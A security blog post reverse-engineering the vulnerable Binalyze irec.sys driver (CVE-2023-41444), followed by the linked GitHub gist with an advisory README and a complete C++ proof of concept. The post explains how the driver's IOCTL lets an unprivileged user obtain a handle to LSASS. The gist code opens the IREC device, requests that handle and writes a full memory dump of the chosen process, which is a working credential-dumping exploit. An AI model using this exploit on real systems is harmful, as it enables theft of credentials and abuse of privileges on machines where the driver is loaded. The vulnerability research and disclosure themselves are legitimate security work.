=== Content from blog.dru1d.ninja_877f55e6_20250110_114604.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fa5eb45093945&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Windows Driver Exploit Development — irec.sys [CVE-2023–41444]

[![Tyler Booth (dru1d)](https://miro.medium.com/v2/resize:fill:88:88/1*h4Dkj6DPfg1OtV37FLI3dA@2x.jpeg)](https://dru1d.medium.com/?source=post_page---byline--a5eb45093945--------------------------------)[![dru1d](https://miro.medium.com/v2/resize:fill:48:48/1*XvyUynQTLUsE0GwiAJ0edA.jpeg)](https://blog.dru1d.ninja/?source=post_page---byline--a5eb45093945--------------------------------)

[Tyler Booth (dru1d)](https://dru1d.medium.com/?source=post_page---byline--a5eb45093945--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F7508d18b24c5&operation=register&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&user=Tyler+Booth+%28dru1d%29&userId=7508d18b24c5&source=post_page-7508d18b24c5--byline--a5eb45093945---------------------post_header-----------)

Published in[dru1d](https://blog.dru1d.ninja/?source=post_page---byline--a5eb45093945--------------------------------)·5 min read·Aug 18, 2023

--

1

Listen

Share

# Background

As we advance in our careers as security professionals, we begin to observe trends in how we can refine our craft. Over time, it’s our hope that defensive capabilities become more advanced and robust. This evolution prompts some trailblazers to adopt innovative approaches, establishing a “meta” that others soon follow. My experience with Windows internals and kernel exploitation mirrors this trend.

I would like to quickly shout out on specific friend who helped me get to where I am today and who has been a major influence — Mike Alfaro (<https://github.com/alfarom256>/<https://twitter.com/_mmpte_software>). If you just search his handle in the [LOLDrivers](https://www.loldrivers.io/) project you’ll find a few gems. One of these gems is the [irec.sys](https://www.loldrivers.io/drivers/d74fdf19-b4b0-4ec2-9c29-4213b064138b/) driver — which coincidentally is tied to an incorrect project of his on GitHub, but I digress.

# Where did this driver come from?

If you read the admittedly vague description from the [LOLDriver entry](https://www.loldrivers.io/drivers/d74fdf19-b4b0-4ec2-9c29-4213b064138b/) it says the driver can be used for privilege escalation. I set out to figure out a bit more about the driver and my first stop was Google. This led me to a digital forensics tool from Binalyze — [IREC](https://www.binalyze.com/irec) (Incident Response Forensic Evidence Collector).

> “Our Proprietary Evidence Collection Engine, IREC, is the Foundation of all Our Products.”

If this driver is truly an integral part of this product, we’re going to have a really powerful tool for Bring Your Own Vulnerable Driver attacks. While the driver is in the LOLDrivers project, it is not in the Microsoft driver blocklist (at the time of writing).

Let’s open the driver in Ghidra and take a look inside…

# What does this driver even do?

When we first open the driver up for review in Ghidra, we need to identify the driver’s entry. This should be fairly straightforward if you have experience reversing drivers already; if not, you should check out this [excellent post from Matt Hand](https://posts.specterops.io/methodology-for-static-reverse-engineering-of-windows-kernel-drivers-3115b2efed83) to get started.

There’s quite a bit of code to look at, but we can identify several key components necessary for communicating with the driver:

* We learn that the name of the device is `\\.\IREC`.

```
  RtlInitUnicodeString((PUNICODE_STRING)&DAT_1400182a0,L"\\Device\\IREC");
  RtlInitUnicodeString((PUNICODE_STRING)&DAT_1400182b0,L"\\DosDevices\\IREC");
```

* We also identify the driver major functions. The function that’s most compelling to us has the function code `0xe` as that's associated with `IRP_MJ_DEVICE_CONTROL`.

```
  DriverObject->MajorFunction[0xe] = FUN_1400029d0;
  DriverObject->MajorFunction[0] = FUN_140002980;
  DriverObject->MajorFunction[2] = FUN_140002980;
```

Now that we’re looking over the disassembly of `FUN_1400029d0` we can start putting together how the driver works in a bit more detail. One thing that I noticed while reviewing this function is that there are actually 22 different switch-cases that lead to multiple different code paths. There are debug strings here so it’s easy to determine what each of these cases do.

EDIT: Some of these functions you might find interesting include:

* Arbitrary file copy/creation (case 0).
* Reading raw disk sectors (case 4).
* Physical memory range enumeration (case 8).
* Physical memory read (case 0xc).
* Read process virtual memory (case 0x24).
* Query virtual memory (case 0x28).

For the purposes of this post, let’s review switch case `0x20`:

```
    case 0x20:
      local_178 = 0;
      local_22c = 0;
      local_128 = local_278;
      local_120 = local_278;
      if (uVar1 < 4) {
        local_288 = 0xc0000023;
        iVar3 = FUN_140001000(0x20);
        if (iVar3 != 0) {
          DbgPrint("OPENPROCESS failed due to ResponseSize %d");
        }
      }
      else {
        local_22c = *(uint *)local_278;
        local_288 = FUN_1400084d0(local_22c,0x410,0,&local_178);
        local_1fc = (uint)(-1 < (int)local_288);
        if (local_1fc == 0) {
          iVar3 = FUN_140001000(0x20);
          if (iVar3 != 0) {
            DbgPrint("OPENPROCESS failed for pid %d");
          }
        }
        else {
          local_27c = 4;
          *(undefined4 *)local_120 = (undefined4)local_178;
          iVar3 = FUN_140001000(1);
          if (iVar3 != 0) {
            DbgPrint("OPENPROCESS succeeded for pid %d");
          }
        }
      }
      break;
```

The debug statements specifically mention that this allows us to “OPENPROCESS”. This means we’ll need to dig further into `FUN_1400084d0` to see how the driver actually performs the action.

```
int FUN_1400084d0(uint param_1,ACCESS_MASK param_2,int param_3,PHANDLE param_4)

{
  NTSTATUS NVar1;
  int iVar2;
  _CLIENT_ID local_50;
  _OBJECT_ATTRIBUTES local_40;

  local_50.UniqueThread = (HANDLE)0x0;
  local_40.Length = 0x30;
  local_40.RootDirectory = (HANDLE)0x0;
  local_40.Attributes = 2;
  local_40.ObjectName = (PUNICODE_STRING)0x0;
  local_40.SecurityDescriptor = (PVOID)0x0;
  local_40.SecurityQualityOfService = (PVOID)0x0;
  if (param_3 != 0) {
    local_40.Attributes = 0x202;
  }
  local_50.UniqueProcess = (HANDLE)(ulonglong)param_1;
  NVar1 = ZwOpenProcess(param_4,param_2,&local_40,&local_50);
  if (NVar1 < 0) {
    iVar2 = FUN_140001000(0x20);
    if (iVar2 != 0) {
      DbgPrint("Open process failed for %d",(ulonglong)param_1);
    }
  }
  return NVar1;
}
```

We can see that the function accepts several parameters. Let’s tidy up the function by renaming and retyping variables as necessary. Given that we’re using the documented Windows API, it should be straightforward to understand what the function does.

```

int OPENPROCESS(uint PID,ACCESS_MASK DesiredAccess,int flag,PHANDLE hProcess)

{
  NTSTATUS status;
  int iVar1;
  _CLIENT_ID clientId;
  _OBJECT_ATTRIBUTES objAttrs;

  clientId.UniqueThread = (HANDLE)0x0;
  objAttrs.Length = 0x30;
  objAttrs.RootDirectory = (HANDLE)0x0;
                    /* OBJ_INHERIT */
  objAttrs.Attributes = 2;
  objAttrs.ObjectName = (PUNICODE_STRING)0x0;
  objAttrs.SecurityDescriptor = (PVOID)0x0;
  objAttrs.SecurityQualityOfService = (PVOID)0x0;
  if (flag != 0) {
                    /* OBJ_INHERIT
                       OBJ_KERNEL_HANDLE */
    objAttrs.Attributes = 0x202;
  }
  clientId.UniqueProcess = (HANDLE)(ulonglong)PID;
  status = ZwOpenProcess(hProcess,DesiredAccess,&objAttrs,&clientId);
  if (status < 0) {
    iVar1 = FUN_140001000(0x20);
    if (iVar1 != 0) {
      DbgPrint("Open process failed for %d",(ulonglong)PID);
    }
  }
  return status;
}

```

We can observe that the function expects a `DWORD` (PID) as input and returns a handle to that process using the same buffer supplied by the user, which operates within the kernel. We don’t need to worry about the access mask or the extra flag as they’re hardcoded for us. It should be noted that the hardcoded access mask is `0x410` and this gives us `PROCESS_QUERY_INFORMATION` and `PROCESS_VM_READ` on the returned process handle. This enables a user to obtain handles to sensitive processes, such as LSASS, and execute a `MiniDumpWriteDump` from an unprivileged context, assuming that the driver has already been loaded.

# PoC or GTFO

This can be accomplished with the following [PoC code](https://gist.github.com/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0) on GitHub.

![Successful LSASS.exe dump by abusing the IREC driver.]()

LSASS Dump via irec.sys driver

![]()

Parsing of minidump

# Where do we go from here?

There’s so much to be learned by reviewing known vulnerable driver samples. If you’re excited about this like I am, I would suggest grabbing some and tearing them apart.

[Windows Kernel](https://medium.com/tag/windows-kernel?source=post_page-----a5eb45093945--------------------------------)[Exploit Development](https://medium.com/tag/exploit-development?source=post_page-----a5eb45093945--------------------------------)[Windows Internals](https://medium.com/tag/windows-internals?source=post_page-----a5eb45093945--------------------------------)[Red Team](https://medium.com/tag/red-team?source=post_page-----a5eb45093945--------------------------------)

--

--

1

[![dru1d](https://miro.medium.com/v2/resize:fill:96:96/1*XvyUynQTLUsE0GwiAJ0edA.jpeg)](https://blog.dru1d.ninja/?source=post_page---post_publication_info--a5eb45093945--------------------------------)[![dru1d](https://miro.medium.com/v2/resize:fill:128:128/1*XvyUynQTLUsE0GwiAJ0edA.jpeg)](https://blog.dru1d.ninja/?source=post_page---post_publication_info--a5eb45093945--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fdru1d&operation=register&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&collection=dru1d&collectionId=609fe925a324&source=post_page---post_publication_info--a5eb45093945---------------------follow_profile-----------)[## Published in dru1d](https://blog.dru1d.ninja/?source=post_page---post_publication_info--a5eb45093945--------------------------------)[1 Follower](/followers?source=post_page---post_publication_info--a5eb45093945--------------------------------)·[Last published Aug 18, 2023](/windows-driver-exploit-development-irec-sys-a5eb45093945?source=post_page---post_publication_info--a5eb45093945--------------------------------)

Security research, musings, and hard lessons learned.

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fdru1d&operation=register&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&collection=dru1d&collectionId=609fe925a324&source=post_page---post_publication_info--a5eb45093945---------------------follow_profile-----------)[![Tyler Booth (dru1d)](https://miro.medium.com/v2/resize:fill:96:96/1*h4Dkj6DPfg1OtV37FLI3dA@2x.jpeg)](https://dru1d.medium.com/?source=post_page---post_author_info--a5eb45093945--------------------------------)[![Tyler Booth (dru1d)](https://miro.medium.com/v2/resize:fill:128:128/1*h4Dkj6DPfg1OtV37FLI3dA@2x.jpeg)](https://dru1d.medium.com/?source=post_page---post_author_info--a5eb45093945--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F7508d18b24c5&operation=register&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&user=Tyler+Booth+%28dru1d%29&userId=7508d18b24c5&source=post_page-7508d18b24c5--post_author_info--a5eb45093945---------------------follow_profile-----------)[## Written by Tyler Booth (dru1d)](https://dru1d.medium.com/?source=post_page---post_author_info--a5eb45093945--------------------------------)[32 Followers](https://dru1d.medium.com/followers?source=post_page---post_author_info--a5eb45093945--------------------------------)·[9 Following](https://medium.com/%40dru1d/following?source=post_page---post_author_info--a5eb45093945--------------------------------)

Principal Offensive Security Consultant. Red Teamer. Avid VHS Collector.

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F7508d18b24c5&operation=register&redirect=https%3A%2F%2Fblog.dru1d.ninja%2Fwindows-driver-exploit-development-irec-sys-a5eb45093945&user=Tyler+Booth+%28dru1d%29&userId=7508d18b24c5&source=post_page-7508d18b24c5--post_author_info--a5eb45093945---------------------follow_profile-----------)
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----a5eb45093945--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----a5eb45093945--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----a5eb45093945--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----a5eb45093945--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----a5eb45093945--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----a5eb45093945--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----a5eb45093945--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----a5eb45093945--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----a5eb45093945--------------------------------)[Teams](https://medium.com/business?source=post_page-----a5eb45093945--------------------------------)



=== Content from gist.github.com_280db062_20250110_114605.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@dru1d-foofus](https://avatars.githubusercontent.com/u/4245930?s=64&v=4)](/dru1d-foofus)

# [dru1d-foofus](/dru1d-foofus)/**[README.md](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0)**

Last active
May 21, 2024 23:56

Show Gist options

* [Download ZIP](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/archive/73893ee51180dc152ac71bc2d187114728cdf90e.zip)

* [Star
  (9)
  9](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0)You must be signed in to star a gist
* [Fork
  (6)
  6](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0.js&quot;&gt;&lt;/script&gt;
* Save dru1d-foofus/1af21179f253879f101c3a8d4f718bf0 to your computer and use it in GitHub Desktop.

[Code](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0)
[Revisions
3](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/revisions)
[Stars
9](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/stargazers)
[Forks
6](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0.js&quot;&gt;&lt;/script&gt;

Save dru1d-foofus/1af21179f253879f101c3a8d4f718bf0 to your computer and use it in GitHub Desktop.

[Download ZIP](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/archive/73893ee51180dc152ac71bc2d187114728cdf90e.zip)

CVE-2023-41444 - IREC.sys Vulnerability

 [Raw](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/raw/73893ee51180dc152ac71bc2d187114728cdf90e/README.md)

[**README.md**](#file-readme-md)

# CVE-2023-41444 - Binalyze IREC.sys Vulnerable Driver

## Credits

Mike Alfaro (@\_mmpte\_software) and Tyler Booth (@tyler\_dru1d)

## Description

An issue in Binalyze IREC.sys v.3.11.0 and before allows a local attacker to execute arbitrary code and escalate privileges due to an improper DACL being applied to the device the driver creates.

## Vulnerability Type

Incorrect Acess Control

## Affected Products

IREC.sys < Version 3.11.0

## References

* <https://blog.dru1d.ninja/windows-driver-exploit-development-irec-sys-a5eb45093945>
* <https://github.com/magicsword-io/LOLDrivers/blob/main/yaml/d74fdf19-b4b0-4ec2-9c29-4213b064138b.yml>

 [Raw](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/raw/73893ee51180dc152ac71bc2d187114728cdf90e/Source.cpp)

[**Source.cpp**](#file-source-cpp)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #include <windows.h> |
| --- | --- |
|  | #include <iostream> |
|  | #include <dbghelp.h> |
|  | #include <TlHelp32.h> |
|  |  |
|  |  |
|  | #define IOCTL\_BASE 0x80012008 |
|  | constexpr DWORD IREC\_IOCTL(DWORD x) { return IOCTL\_BASE + x; } |
|  | #define IOTCL\_IREC\_OPEN\_PROCESS IREC\_IOCTL( 0x20 ) |
|  | static const char\* DeviceName = R"(\\.\IREC)"; |
|  |  |
|  | typedef struct \_IREC\_OPEN\_PROCESS { |
|  | DWORD pid; |
|  | } IREC\_OPEN\_PROCESS, \* PIREC\_OPEN\_PROCESS; |
|  |  |
|  |  |
|  | DWORD GetProcessIdByName(const std::wstring & processName) { |
|  | HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS\_SNAPPROCESS, 0); |
|  | PROCESSENTRY32 pEntry; |
|  | pEntry.dwSize = sizeof(pEntry); |
|  |  |
|  | BOOL hRes = Process32First(hSnapShot, &pEntry); |
|  | while (hRes) { |
|  | if (wcscmp(pEntry.szExeFile, processName.c\_str()) == 0) { |
|  | CloseHandle(hSnapShot); |
|  | return pEntry.th32ProcessID; |
|  | } |
|  | hRes = Process32Next(hSnapShot, &pEntry); |
|  | } |
|  |  |
|  | CloseHandle(hSnapShot); |
|  | return 0; // If process is not found return 0 |
|  | } |
|  |  |
|  | std::wstring StringToWString(const std::string & s) { |
|  | int len; |
|  | int slength = (int)s.length() + 1; |
|  | len = MultiByteToWideChar(CP\_ACP, 0, s.c\_str(), slength, 0, 0); |
|  | wchar\_t\* buf = new wchar\_t[len]; |
|  | MultiByteToWideChar(CP\_ACP, 0, s.c\_str(), slength, buf, len); |
|  | std::wstring r(buf); |
|  | delete[] buf; |
|  | return r; |
|  | } |
|  |  |
|  | constexpr DWORD cexpr\_lstrlenW(const wchar\_t str[]) { |
|  | DWORD i = 0; |
|  | while (str[i++]) {} |
|  | return i; |
|  | } |
|  |  |
|  | void DumpProcess(const std::string & processName, const std::string & dumpFilePath) { |
|  |  |
|  | std::wstring wideProcessName = StringToWString(processName); |
|  |  |
|  | HANDLE hDevice = INVALID\_HANDLE\_VALUE; |
|  | BOOL bResult = FALSE; |
|  | BOOL bDumpResult = FALSE; |
|  | HANDLE hProcess = NULL; |
|  | DWORD dwBytesReturned; |
|  |  |
|  | DWORD processId = GetProcessIdByName(wideProcessName); // Replace with actual function to get PID from process name |
|  |  |
|  | hDevice = CreateFileA(DeviceName, GENERIC\_READ | GENERIC\_WRITE, FILE\_SHARE\_READ | FILE\_SHARE\_WRITE, NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL); |
|  |  |
|  | if (hDevice == NULL) { |
|  | printf("Failed to open device.\n"); |
|  | return; |
|  | } |
|  |  |
|  | IREC\_OPEN\_PROCESS openProcess; |
|  | openProcess.pid = processId; |
|  |  |
|  | bResult = DeviceIoControl(hDevice, IOTCL\_IREC\_OPEN\_PROCESS, &openProcess, sizeof(DWORD), &openProcess, sizeof(HANDLE), &dwBytesReturned, NULL); |
|  |  |
|  | if (!bResult) { |
|  | printf("DeviceIoControl failed with error: %d\n", GetLastError()); |
|  | return; |
|  | } |
|  |  |
|  | hProcess = (HANDLE)openProcess.pid; |
|  |  |
|  | processId = GetProcessId(hProcess); |
|  | if (processId == 0) { |
|  | printf("Failed to get process ID. Error: %lu\n", GetLastError()); |
|  | return; |
|  | } |
|  |  |
|  | printf("[\*] %s Process ID: %lu\n", processName.c\_str(), processId); |
|  |  |
|  | if (!hProcess || hProcess == INVALID\_HANDLE\_VALUE) { |
|  | printf("Invalid process handle: %p\n", hProcess); |
|  | return; |
|  | } |
|  |  |
|  | HANDLE hFile = CreateFileA(dumpFilePath.c\_str(), GENERIC\_WRITE, FILE\_SHARE\_WRITE, NULL, CREATE\_ALWAYS, FILE\_ATTRIBUTE\_NORMAL, NULL); |
|  |  |
|  | if (hFile == INVALID\_HANDLE\_VALUE) { |
|  | DWORD dwError = GetLastError(); |
|  | printf("CreateFileA failed with error: %lu\n", dwError); |
|  | return; |
|  | } |
|  |  |
|  | bDumpResult = MiniDumpWriteDump(hProcess, 0, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL); |
|  | if (!bDumpResult) { |
|  | DWORD dwError = GetLastError(); |
|  | printf("Dump failed with error: %lu\n" + dwError); |
|  | } |
|  | else { |
|  | printf("[\*] Dump succeeded.\n"); |
|  | } |
|  | CloseHandle(hProcess); |
|  | CloseHandle(hFile); |
|  | } |
|  |  |
|  | void ShowHelp() { |
|  | printf("Usage: program [command] [arguments]\n"); |
|  | printf("Here are the available commands:\n"); |
|  |  |
|  | printf("\tdump <process name> <file path>: Dump a process memory into a file.\n"); |
|  | printf("\t\tExample: IREC-PoC.exe dump process.exe C:\\temp\\dumpfile.dmp\n"); |
|  |  |
|  | printf("If no command is provided, the help menu will be displayed.\n"); |
|  | } |
|  |  |
|  | int main(int argc, char\* argv[]) { |
|  | if (argc < 2) { |
|  | ShowHelp(); |
|  | return -1; |
|  | } |
|  |  |
|  | std::string command = argv[1]; |
|  |  |
|  | if (command == "dump") { |
|  | if (argc < 4) { |
|  | printf("Please provide a process name and a dump file path with the dump command.\n"); |
|  | return -1; |
|  | } |
|  | std::string processName = argv[2]; |
|  | std::string dumpFilePath = argv[3]; |
|  | DumpProcess(processName, dumpFilePath); |
|  | } |
|  | else { |
|  | ShowHelp(); |
|  | return -1; |
|  | } |
|  |  |
|  | return 0; |
|  | } |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


